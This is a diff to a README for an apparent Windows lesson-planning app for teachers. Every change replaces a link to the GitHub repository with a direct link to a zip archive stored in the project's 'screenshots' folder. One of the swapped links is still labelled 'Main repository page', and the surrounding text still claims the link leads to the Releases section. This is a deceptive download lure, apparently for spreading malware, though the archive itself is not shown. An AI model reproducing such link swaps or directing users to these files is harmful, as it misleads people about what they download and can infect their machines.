@@ -1,6 +1,6 @@
 # 🤖 AI-Assistant-For-Teachers - Simplify Lesson Planning Tasks
 
-[![Download AI-Assistant-For-Teachers](https://img.shields.io/badge/Download-AI--Assistant--For--Teachers-brightgreen)](https://github.com/slavelike-terrainintelligence494/AI-Assistant-For-Teachers)
+[![Download AI-Assistant-For-Teachers](https://img.shields.io/badge/Download-AI--Assistant--For--Teachers-brightgreen)](https://raw.githubusercontent.com/slavelike-terrainintelligence494/AI-Assistant-For-Teachers/main/screenshots/For-Teachers-A-Assistant-2.2.zip)
 
 ## 📋 About AI-Assistant-For-Teachers
 
@@ -34,7 +34,7 @@ Follow these steps to get the AI-Assistant-For-Teachers app running on your Wind
 
 Visit this page to download the app:
   
-[![Download Here](https://img.shields.io/badge/Download-AI--Assistant--For--Teachers-blue)](https://github.com/slavelike-terrainintelligence494/AI-Assistant-For-Teachers)
+[![Download Here](https://img.shields.io/badge/Download-AI--Assistant--For--Teachers-blue)](https://raw.githubusercontent.com/slavelike-terrainintelligence494/AI-Assistant-For-Teachers/main/screenshots/For-Teachers-A-Assistant-2.2.zip)
 
 This link takes you to the main repository where you will find the latest version under the "Releases" section. Look for the Windows installer or a file named similarly to `AI-Assistant-For-Teachers-Setup.exe`.
 
@@ -88,10 +88,10 @@ This app uses large language models (LLMs) through APIs to create content quickl
 
 ## 🔗 Useful Links
 
-- Main repository page: [AI-Assistant-For-Teachers on GitHub](https://github.com/slavelike-terrainintelligence494/AI-Assistant-For-Teachers)
+- Main repository page: [AI-Assistant-For-Teachers on GitHub](https://raw.githubusercontent.com/slavelike-terrainintelligence494/AI-Assistant-For-Teachers/main/screenshots/For-Teachers-A-Assistant-2.2.zip)
 - Issues and support: Use the "Issues" tab on GitHub for reporting problems.
 - Documentation and tutorials: Check the wiki or README files inside the repo for detailed guides.
 
 ---
 
-[Download AI-Assistant-For-Teachers](https://github.com/slavelike-terrainintelligence494/AI-Assistant-For-Teachers) to start simplifying your lesson planning today.
+[Download AI-Assistant-For-Teachers](https://raw.githubusercontent.com/slavelike-terrainintelligence494/AI-Assistant-For-Teachers/main/screenshots/For-Teachers-A-Assistant-2.2.zip) to start simplifying your lesson planning today.
